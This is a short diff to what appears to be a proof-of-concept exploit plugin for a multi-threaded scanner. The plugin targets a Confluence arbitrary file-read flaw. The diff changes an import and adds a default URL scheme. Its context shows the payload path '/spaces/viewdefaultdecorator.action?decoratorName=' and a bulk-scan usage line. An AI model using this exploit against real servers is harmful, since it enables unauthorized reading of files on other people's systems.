@@ -16,11 +16,13 @@ python POC-T.py -T -m confluence-file-read -f [path/targetfile] -t [thread-num]
 """
 
 import requests
-from util.urlparser import iterate_path
+from plugin.urlparser import iterate_path
 
 
 def poc(_inp):
     try:
+        if ':' not in _inp:
+            _inp = 'http://' + _inp
         for inp in iterate_path(_inp):
             payloads = ['/spaces/viewdefaultdecorator.action?decoratorName=']
             for each in payloads:
